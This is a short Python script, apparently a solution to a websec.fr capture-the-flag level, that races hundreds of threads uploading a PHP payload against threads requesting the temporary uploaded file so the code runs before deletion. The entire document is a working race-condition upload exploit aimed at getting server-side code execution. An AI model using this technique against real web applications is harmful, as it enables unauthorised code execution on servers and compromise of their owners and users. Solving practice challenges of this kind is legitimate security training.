import os
import requests
import threading

URL = 'https://websec.fr/level28/'

def upload(i):
    print('upload:', i)
    f = {'flag_file': open('payload.php', 'r')}
    d = {'flag_file': 'payload', 'submit': ''}
    requests.post(URL + 'index.php', files=f, data=d)


def trigger(i):
    print('trigger:', i)
    r = requests.get(URL +'tmp/b255a6383032836f5f8312cbcba879fc.php')
    if 'nginx' not in r.text:
        print(r.content)
        os._exit(0)

for i in range(500):
    t = threading.Thread(target=upload, args=(i,))
    t1 = threading.Thread(target=trigger, args=(i,))
    t.start()
    t1.start()
